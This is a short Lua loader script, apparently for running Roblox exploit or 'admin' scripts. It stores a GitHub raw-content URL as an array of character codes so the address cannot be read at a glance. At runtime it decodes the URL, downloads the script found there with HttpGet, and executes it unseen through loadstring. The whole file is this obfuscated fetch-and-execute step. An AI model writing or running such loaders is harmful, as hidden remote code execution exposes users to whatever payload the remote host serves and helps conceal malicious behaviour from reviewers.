
-- M7 | Numeric Loader

local n = {
104,116,116,112,115,58,47,47,
114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,
47,98,117,98,105,105,50,48,55,54,52,50,50,53,50,56,45,99,112,117,
47,97,100,109,105,110,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
77,55,46,108,117,97
}

local c = {}
for i,v in ipairs(n) do
    c[i] = string.char(v)
end

local u = table.concat(c)

local ok, result = pcall(function()
    local s = game:HttpGet(u)
    assert(type(s) == "string" and #s > 0, "Empty source")

    local f, e = loadstring(s)
    assert(f, e)

    return f()
end)

if not ok then
    warn("M7 ERROR: " .. tostring(result))
end
